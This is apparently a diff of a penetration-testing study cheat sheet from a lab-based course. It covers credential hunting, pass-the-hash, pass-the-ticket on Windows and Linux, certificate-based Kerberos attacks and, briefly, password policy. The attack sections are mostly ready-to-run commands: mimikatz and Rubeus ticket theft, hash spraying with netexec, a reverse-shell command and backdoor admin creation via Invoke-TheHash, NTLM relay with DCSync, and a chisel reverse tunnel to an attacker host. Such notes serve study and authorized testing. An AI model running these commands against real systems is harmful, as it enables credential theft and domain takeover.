+http contains "passw"                 # string in packets (also Edit > Find Packet)
+ip.addr == <IP> / tcp.port == 80
+tcp.stream eq 53                      # follow one conversation
+ip.src == A && ip.dst == B
+tcp.flags.syn == 1 && tcp.flags.ack == 0   # scanning/connection attempts
+```
+
+Pcredz automates it over pcaps or live interfaces — pulls credit card numbers, POP/SMTP/IMAP creds, SNMP community strings, FTP creds, HTTP basic/NTLM headers and forms, NTLMv1/v2 from SMB/LDAP/MSSQL/RPC/HTTP, and Kerberos AS-REQ pre-auth (etype 23) hashes:
+
+```bash
+./Pcredz -f demo.pcapng -t -v
+```
+
+## Credential Hunting in Network Shares
+
+Patterns first: keywords `passw`, `user`, `token`, `key`, `secret`; extensions `.ini .cfg .env .xlsx .ps1 .bat`; filenames containing config/user/passw/cred/initial; the `DOMAIN\` string inside files. Localize keywords for the target (German org → "Benutzer"). Be strategic — IT shares beat photo shares.
+
+Windows (domain-joined):
+
+```cmd
+Snaffler.exe -s      :: auto-discovers shares + interesting files (e.g. unattend.xml AdministratorPassword hits)
+                     :: -u search for AD user references, -i/-n include/exclude shares
+```
+
+```powershell
+Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public   # PowerHuntShares — HTML report, hours in big envs
+```
+
+Linux:
+
+```bash
+# MANSPIDER (docker), content search:
+docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <TARGET_IP> -c 'passw' -u <USER> -p '<PASSWORD>'
+
+# NetExec spider:
+nxc smb <TARGET_IP> -u <USER> -p '<PASSWORD>' --spider IT --content --pattern "passw"
+```
+
+All of these need manual review — false positives are the norm.
 
 ## Pass the Hash (PtH)
 
-PtH uses NTLM hash directly for authentication — no plaintext needed. Works because NTLM doesn't salt hashes per session.
+NTLM hashes are unsalted and static until the password changes — authenticate *with the hash*, no cracking required. Hash sources: SAM dump, NTDS.dit, LSASS memory.
 
-**Mimikatz (Windows):**
+Windows:
 
 ```cmd
-mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /run:cmd.exe" exit
+mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:<NTHASH> /domain:inlanefreight.htb /run:cmd.exe" exit
 ```
 
-**Invoke-TheHash (Windows, PowerShell):**
+Invoke-TheHash (no local admin needed client-side; the hash's account needs admin on target):
 
 ```powershell
 Import-Module .\Invoke-TheHash.psd1
-Invoke-SMBExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "net user <USER> <PASS> /add && net localgroup administrators <USER> /add"
-Invoke-WMIExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "<CMD>"
+Invoke-SMBExec -Target <TARGET_IP> -Domain <DOMAIN> -Username julio -Hash <NTHASH> -Command "net user mark Password123 /add && net localgroup administrators mark /add"
+Invoke-WMIExec -Target DC01 -Domain <DOMAIN> -Username julio -Hash <NTHASH> -Command "powershell -e <base64-revshell>"
 ```
 
-**Impacket (Linux):**
+Linux:
 
 ```bash
-impacket-psexec <USER>@<TARGET> -hashes :<NTLM_HASH>
-impacket-wmiexec <USER>@<TARGET> -hashes :<NTLM_HASH>
-impacket-smbexec <USER>@<TARGET> -hashes :<NTLM_HASH>
-# Format: LMhash:NThash (use aad3b435b51404eeaad3b435b51404ee for empty LM)
+impacket-psexec administrator@<TARGET_IP> -hashes :<NTHASH>     # also: wmiexec, atexec, smbexec
+
+netexec smb <SUBNET>/24 -u Administrator -d . -H <NTHASH>            # spray the hash across the subnet
+netexec smb <SUBNET>/24 -u Administrator --local-auth -H <NTHASH>    # local-admin hash reuse (gold images)
+netexec smb <TARGET_IP> -u Administrator -d . -H <NTHASH> -x whoami  # Pwn3d! + command exec
+
+evil-winrm -i <TARGET_IP> -u Administrator -H <NTHASH>               # domain account: administrator@domain
+xfreerdp /v:<TARGET_IP> /u:julio /pth:<NTHASH>                       # RDP PtH — needs Restricted Admin Mode
 ```
 
-**NetExec (Linux):**
+RDP PtH prerequisite (else "Account restrictions..." error):
 
-```bash
-netexec smb <SUBNET>/24 -u Administrator -d . -H <NTLM_HASH>       # spray subnet
-netexec smb <TARGET> -u Administrator -d . -H <NTLM_HASH> -x whoami # exec command
-netexec smb <TARGET> --local-auth -u admin -H <NTLM_HASH>           # local auth
-# (Pwn3d!) = local admin confirmed
-```
-
-**Evil-WinRM:**
-
-```bash
-evil-winrm -i <TARGET> -u Administrator -H <NTLM_HASH>
-```
-
-**xfreerdp (RDP PtH):**
-
-```bash
-# Must enable Restricted Admin Mode first
+```cmd
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
-
-xfreerdp /v:<TARGET> /u:<USER> /pth:<NTLM_HASH>
 ```
 
-> [!warning] UAC limits PtH for local accounts. By default only RID-500 (Administrator) can PtH remotely. Domain admin accounts bypass this restriction. If `FilterAdministratorToken` is enabled, even RID-500 is blocked.
+UAC limits PtH for **local** accounts: `LocalAccountTokenFilterPolicy = 0` means only the built-in RID-500 Administrator can do remote admin (unless `FilterAdministratorToken = 1`, which enrolls even RID-500 in UAC). Domain accounts with admin rights are exempt. Local admin password reuse across hosts is rampant (gold images) — the client fix is LAPS.
 
----
+## Pass the Ticket (PtT) from Windows
 
-## Pass the Ticket (PtT) — Windows
+Kerberos in one breath: user encrypts a timestamp with their password hash → KDC (DC) validates and returns a **TGT**; TGT is presented to request **TGS** per service. A stolen ticket (TGS for one resource, TGT for anything the user can reach) = lateral movement without the password.
 
-Kerberos ticket types: TGT (get any TGS), TGS (access specific service).
-
-**Export tickets with Mimikatz:**
+Harvest (as admin, all tickets; non-admin gets only your own):
 
 ```cmd
-privilege::debug
-sekurlsa::tickets /export       # exports .kirbi files
-sekurlsa::ekeys                 # extract AES256/RC4 keys for OverPass-the-Hash
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export     :: .kirbi files; ending in $ = computer account; service "krbtgt" = that account's TGT
+
+Rubeus.exe dump /nowrap                 :: same data as Base64
 ```
 
-**Export tickets with Rubeus:**
+**Pass the Key / OverPass the Hash** — convert a key/hash into a fresh TGT. Dump keys first:
 
 ```cmd
-Rubeus.exe dump /nowrap         # base64 encoded
+mimikatz # sekurlsa::ekeys      :: yields aes256_hmac + rc4_hmac per user
 ```
 
-**OverPass-the-Hash (hash → TGT):**
-
 ```cmd
-# Mimikatz
-sekurlsa::pth /domain:<DOMAIN> /user:<USER> /ntlm:<HASH>
-# Opens new cmd.exe; Kerberos then auto-requests TGT
-
-# Rubeus — request TGT from hash
-Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /rc4:<NTLM_HASH> /ptt
-Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /aes256:<AES256_HASH> /ptt
+mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:<AES256KEY> /nowrap     :: Rubeus needs no admin
 ```
 
-**Import/inject ticket:**
+Prefer AES keys over rc4/NTLM in Kerberos exchanges — rc4 in a modern domain (2008+) reads as an encryption downgrade.
+
+**PtT** — import and go:
 
 ```cmd
-# Rubeus — from file
-Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-user@krbtgt-domain.kirbi
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<HASH> /ptt      :: request + import in one
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+Rubeus.exe ptt /ticket:<base64-kirbi>
+mimikatz # kerberos::ptt ticket.kirbi        :: misc::cmd opens a cmd with the ticket applied
 
-# Rubeus — from base64
-Rubeus.exe ptt /ticket:<BASE64_BLOB>
-
-# Mimikatz — from file
-kerberos::ptt "C:\path\to\ticket.kirbi"
-
-# Convert .kirbi to base64 (PowerShell)
+# kirbi -> base64:
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
-
-# Verify imported tickets
-klist
 ```
 
-**PowerShell Remoting with PtT:**
+Then `dir \\DC01\c$`, or PowerShell Remoting (admin / Remote Management Users membership):
 
-```cmd
-# Import ticket then launch PowerShell
-mimikatz # kerberos::ptt "ticket.kirbi"
-mimikatz # exit
-powershell
+```powershell
 Enter-PSSession -ComputerName DC01
 ```
 
-**Rubeus sacrificial process:**
+To avoid trashing your current session's TGT, use a sacrificial logon session first:
 
 ```cmd
 Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
-# In new window:
-Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<HASH> /ptt
-powershell
-Enter-PSSession -ComputerName DC01
+:: then run asktgt /ptt from the new window
 ```
 
----
+## Pass the Ticket (PtT) from Linux
 
-## Pass the Ticket (PtT) — Linux
+Linux stores tickets as **ccache** files (`/tmp/krb5cc_*`, path in `KRB5CCNAME`) and **keytab** files (principal + encrypted key pairs; portable; must be recreated on password change). Machine account keytab: `/etc/krb5.keytab` (root-only) — owning it = impersonating `HOST$`.
 
-**Identify domain-joined Linux:**
+Confirm domain membership:
 
 ```bash
-realm list                            # shows domain + permitted users
-ps -ef | grep -i "winbind\|sssd"      # check AD integration services
+realm list                          # domain, permitted users/groups
+ps -ef | grep -i "winbind\|sssd"    # fallback check
 ```
 
-**Find Kerberos tickets:**
+Find the goods:
 
 ```bash
-# ccache files (active session tickets)
-env | grep -i KRB5CCNAME              # current session ticket path
-ls -la /tmp/krb5cc_*                  # all ccache files in /tmp
-
-# keytab files (service account credentials)
-find / -name *keytab* -ls 2>/dev/null
-cat /etc/crontab                      # scripts using kinit often reference keytab
+find / -name *keytab* -ls 2>/dev/null      # need rw on the file to use it
+env | grep -i krb5                          # KRB5CCNAME=FILE:/tmp/krb5cc_...
+ls -la /tmp                                 # every logged-in user's ccache
+crontab -l                                  # scripts often kinit with a keytab
 ```
 
-**Abuse keytab files:**
+Impersonate with a keytab:
 
 ```bash
-klist -k -t /opt/carlos.keytab        # show principal in keytab
-kinit carlos@DOMAIN.COM -k -t /opt/carlos.keytab   # import into session
-klist                                 # verify TGT obtained
-smbclient //dc01/share -k -c ls       # use ticket
+klist -k -t /opt/specialfiles/carlos.keytab     # shows the principal — kinit is CASE-SENSITIVE (user lowercase, DOMAIN uppercase)
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+klist                                            # confirm new default principal
+smbclient //dc01/carlos -k -no-pass -c ls
 ```
 
-**Extract hashes from keytab:**
+Crack a keytab's secrets instead:
 
 ```bash
-python3 /opt/keytabextract.py keytab_file    # extracts NTLM + AES hashes
-# NTLM → PtH or crack with hashcat -m 1000
-# AES256 → forge tickets or crack
+python3 keytabextract.py carlos.keytab      # → NTLM, AES-256, AES-128 hashes
+# NTLM → PtH; AES → forge tickets or crack (crackstation.net is fast for NTLM)
 ```
 
-**Abuse ccache files (needs root):**
+Abuse a ccache (read access is enough — root gets everyone's):
 
 ```bash
-cp /tmp/krb5cc_647401106_HRJDux /root/
-export KRB5CCNAME=/root/krb5cc_647401106_HRJDux
-klist
-smbclient //dc01/C$ -k -c ls -no-pass
-impacket-wmiexec dc01 -k -no-pass
+cp /tmp/krb5cc_647401106_I8I133 .
+export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+klist                                        # check principal + expiry — expired tickets are dead
+smbclient //dc01/C$ -k -no-pass
 ```
 
-**Linux → DC via Impacket (proxychains if needed):**
+From a non-domain attack host: proxy to the KDC (Chisel + proxychains) and hardcode resolution:
 
 ```bash
-# Edit /etc/hosts for name resolution
-echo "<DC_IP> dc01.domain.local dc01" >> /etc/hosts
+# /etc/hosts: 172.16.1.10 inlanefreight.htb dc01.inlanefreight.htb dc01
+# /etc/proxychains.conf: socks5 127.0.0.1 1080
+sudo ./chisel server --reverse                      # attacker
+c:\tools\chisel.exe client <ATTACKER_IP>:8080 R:socks   # on MS01
 
-export KRB5CCNAME=/tmp/ticket.ccache
-impacket-wmiexec dc01 -k -no-pass
-impacket-psexec dc01 -k -no-pass
-proxychains impacket-wmiexec dc01 -k
+export KRB5CCNAME=/path/to/krb5cc_file
+proxychains impacket-wmiexec dc01 -k                # hostname, never IP; -no-pass if prompted
 ```
 
-**Evil-WinRM with Kerberos (Linux):**
+evil-winrm over Kerberos needs krb5 config:
 
 ```bash
-sudo apt-get install krb5-user -y
-# Configure /etc/krb5.conf:
-# [libdefaults] default_realm = DOMAIN.COM
-# [realms] DOMAIN.COM = { kdc = dc01.domain.com }
-
-evil-winrm -i dc01.domain.local -r domain.local
+sudo apt-get install krb5-user -y        # realm = DOMAIN (uppercase), KDC = dc01
+# /etc/krb5.conf: [libdefaults] default_realm = <REALM>; [realms] <REALM> = { kdc = dc01.domain }
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
 ```
 
-**Convert ticket formats:**
+Ticket format conversion:
 
 ```bash
-# ccache (Linux) → kirbi (Windows)
-impacket-ticketConverter krb5cc_file output.kirbi
-
-# kirbi (Windows) → ccache (Linux)
-impacket-ticketConverter ticket.kirbi output.ccache
+impacket-ticketConverter krb5cc_... julio.kirbi    # ccache <-> kirbi, both directions
 ```
 
-**Linikatz (automated Linux Kerberos dumper):**
+Linikatz (Cisco) = mimikatz for Linux-AD boxes — as root, pulls credentials + tickets from SSSD/FreeIPA/Samba/Vintella into a `linikatz.*` folder (ccache + keytab formats ready to reuse).
+
+## Pass the Certificate
+
+PKINIT = Kerberos initial authentication with public keys (smart cards). Pass-the-Certificate = trading an X.509 cert for a TGT. Pairs with AD CS attacks and Shadow Credentials.
+
+**ESC8** — relay NTLM to the CA's HTTP web enrollment (`/CertSrv`):
 
 ```bash
-wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
-sudo ./linikatz.sh    # needs root; extracts all ccache + keytab from system
-```
-
----
-
-## Pass the Certificate (ESC8 / Shadow Credentials)
-
-**ESC8 — ADCS NTLM relay:**
-
-```bash
-# 1. Start relay listener
 impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+python3 printerbug.py <DOMAIN>/user:'<PASSWORD>'@<DC_IP> <ATTACKER_IP>    # coerce DC01$ to authenticate (needs Spooler)
+# relay output: GOT CERTIFICATE → DC01$.pfx
+```
 
-# 2. Force target machine to authenticate (printer bug)
-python3 printerbug.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP> <LHOST>
+Exchange the PFX for a TGT (PKINITtools):
 
-# 3. Relay issues certificate (DC01$.pfx)
-# 4. Convert cert to TGT
-python3 gettgtpkinit.py -cert-pfx DC01\$.pfx -dc-ip <DC_IP> '<DOMAIN>/DC01$' /tmp/dc.ccache
+```bash
+python3 gettgtpkinit.py -cert-pfx DC01\$.pfx -dc-ip <DC_IP> '<DOMAIN>/dc01$' /tmp/dc.ccache
+# note the AS-REP encryption key it prints — needed for some follow-ups
+```
 
-# 5. DCSync
+Now it's PtT again — and as DC01$ you can DCSync:
+
+```bash
 export KRB5CCNAME=/tmp/dc.ccache
-impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user Administrator '<DOMAIN>/DC01$'@dc01.<DOMAIN>
+impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user Administrator '<DOMAIN>/DC01$'@DC01.<DOMAIN>
 ```
 
-**Shadow Credentials (msDS-KeyCredentialLink):**
+**Shadow Credentials** — with write rights over a victim's `msDS-KeyCredentialLink` (BloodHound: AddKeyCredentialLink edge), plant your own key:
 
 ```bash
-# AddKeyCredentialLink edge in BloodHound = can write victim's msDS-KeyCredentialLink
-
-# Write public key to victim
-pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u <CONTROLLED_USER> -p <PASS> --target <VICTIM_USER> --action add
-# Outputs: <pfx_file>.pfx + password
-
-# Get TGT as victim
-python3 gettgtpkinit.py -cert-pfx <file>.pfx -pfx-pass <PFX_PASS> -dc-ip <DC_IP> <DOMAIN>/<VICTIM> /tmp/victim.ccache
-
-# Use TGT
-export KRB5CCNAME=/tmp/victim.ccache
-evil-winrm -i dc01.<DOMAIN> -r <DOMAIN>
+pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u wwhite -p '<PASSWORD>' --target jpinkman --action add
+# → prints a PFX file + its password
+python3 gettgtpkinit.py -cert-pfx eFUVVTPf.pfx -pfx-pass '<PFX-PASSWORD>' -dc-ip <DC_IP> <DOMAIN>/jpinkman /tmp/jpinkman.ccache
+export KRB5CCNAME=/tmp/jpinkman.ccache
+evil-winrm -i dc01.<DOMAIN> -r <DOMAIN>       # if the victim is in Remote Management Users
 ```
 
-PKINITtools: https://github.com/dirkjanm/PKINITtools
+No PKINIT support on the KDC for your victim? PassTheCert authenticates to LDAPS with the cert directly (password changes, granting DCSync rights).
 
----
+## Password Policies
 
-## Credential Hunting — Windows
+A policy = definition (rules for creation/storage/rotation/transmission) + enforcement (tech, e.g. AD Password Policy GPO, plus communicated processes). Standards to anchor on: NIST SP800-63B, CIS Password Policy Guide, PCI DSS.
 
-```cmd
-# findstr — search file contents
-findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+Modern direction: **disable** periodic expiration — forced rotation breeds `Inlanefreight01! → 02! → 03!` patterns that satisfy policy and stay guessable. Blacklist in policy: company name, company-related words, months, seasons, welcome/password variants, the obvious (`password`, `123456`). Strong passwords: generated (`CjDC2x[U`) or long passphrases (`()The name of my dog is Popy!`) — but remember attackers OSINT the passphrase ingredients.
 
-# LaZagne — extract credentials from installed apps
-start LaZagne.exe all
-start LaZagne.exe -vv all
-```
+## Password Managers
 
-High-value search locations:
+Average person: ~100 passwords — hence reuse. Managers store everything in an encrypted database under a master password (KDFs, salted). Cloud (1Password, Bitwarden, Dashlane, Keeper, LastPass, NordPass, RoboForm) sync across devices with zero-knowledge designs (Bitwarden: master key from master password via KDF, separate auth hash for the server, derived decryption key for vault items). Local (KeePass, KWalletManager, Pleasant Password Server, Password Safe) keeps the database on your machine — same crypto family, you own the storage risk. Feature checklist: 2FA, multi-platform, browser extension, autocomplete, import/export, generation.
 
-- `C:\Windows\Panther\unattend.xml` — deployment passwords
-- SYSVOL share — GPP passwords (Group Policy)
-- `web.config` on dev/IT shares
-- Scripts on IT shares
-- KeePass `.kdbx` databases
-- AD user/computer Description fields
-- Files named pass.txt, passwords.docx, credentials.xlsx
-
-**Snaffler (domain-joined machine, automated share hunt):**
-
-```cmd
-Snaffler.exe -s           # auto-discover + search all accessible shares
-Snaffler.exe -s -u        # also search for AD usernames in files
-```
-
-**PowerHuntShares:**
-
-```powershell
-Import-Module .\PowerHuntShares.ps1
-Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\output
-# Generates HTML report
-```
-
----
-
-## Credential Hunting — Linux
-
-```bash
-# Config files
-for l in $(echo ".conf .config .cnf"); do find / -name "*$l" 2>/dev/null | grep -v "lib\|fonts\|share\|core"; done
-
-# Grep configs for credentials
-for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do grep "user\|password\|pass" $i 2>/dev/null | grep -v "#"; done
-
-# Database files
-for l in $(echo ".sql .db .*db .db*"); do find / -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"; done
-
-# Scripts
-for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do find / -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share"; done
-
-# SSH keys
-grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
-
-# Bash history — may contain creds in commands
-tail -n5 /home/*/.bash*
-
-# Log files — look for auth events
-for i in $(ls /var/log/* 2>/dev/null); do GREP=$(grep "accepted\|session opened\|failure\|failed\|ssh\|password changed\|COMMAND=" $i 2>/dev/null); if [[ $GREP ]]; then echo "#### Log: $i"; echo "$GREP"; fi; done
-
-# Cronjobs — may reference keytab/credentials
-cat /etc/crontab
-ls -la /etc/cron.*/
-
-# Memory — dump cleartext creds
-sudo python3 mimipenguin.py
-sudo python2.7 laZagne.py all
-
-# Firefox saved passwords
-python3.9 firefox_decrypt.py
-# or
-python3 laZagne.py browsers
-
-# Hunt encrypted files
-for ext in $(echo ".xls .xls* .doc .doc* .pdf .pp*"); do find / -name "*$ext" 2>/dev/null | grep -v "lib\|fonts\|share\|core"; done
-```
-
----
-
-## Credential Hunting — Network Traffic
-
-```bash
-# Pcredz — extract creds from PCAP
-./Pcredz -f capture.pcapng -t -v
-# Extracts: FTP, SNMP community strings, IMAP/POP3/SMTP, HTTP basic/forms, NTLMv1/v2, Kerberos AS-REQ
-
-# Wireshark filters
-# http.request.method == "POST"           → plaintext form credentials
-# http contains "passw"                    → password strings in HTTP
-# tcp.stream eq N                          → follow TCP stream
-```
-
-MANSPIDER (Linux, remote SMB hunt):
-
-```bash
-docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <TARGET> -c 'passw' -u <USER> -p <PASS>
-```
-
----
-
-## Linux Authentication Files
-
-```bash
-# /etc/passwd — world-readable, uid:gid:GECOS:home:shell
-# Password field: x = hashes in /etc/shadow, blank = no password needed
-
-# /etc/shadow — root-only, password hashes
-# Format: $<id>$<salt>$<hash>
-# Hash IDs: 1=MD5, 5=SHA-256, 6=SHA-512, y=yescrypt (Debian default)
-
-# /etc/security/opasswd — old password hashes (PAM reuse prevention)
-sudo cat /etc/security/opasswd
-# Note: MD5 ($1$) hashes here are weak → crack and look for reuse patterns
-
-# Crack Linux hashes
-cp /etc/passwd /tmp/passwd.bak && cp /etc/shadow /tmp/shadow.bak
-unshadow /tmp/passwd.bak /tmp/shadow.bak > unshadowed.hashes
-hashcat -m 1800 -a 0 unshadowed.hashes rockyou.txt   # SHA-512 crypt
-```
-
-> [!warning] If `/etc/passwd` is world-writable (misconfiguration): delete the `x` password field for root → `su` without password. Rare but impactful.
-
-> [!tip] Priority credential hunting workflow: bash_history → config files (grep pass/user) → scripts → SSH keys → LaZagne → browser creds → memory (mimipenguin). On Windows: LaZagne → findstr → Credential Manager (cmdkey) → browser decrypt → LSASS dump.
+Alternatives beyond passwords: MFA, FIDO2 (YubiKey), OTP/TOTP, IP restrictions, device compliance (Intune/Workspace ONE) — and the passwordless push (Microsoft, Auth0, Okta, Ping): possession/inherent factors instead of knowledge factors.
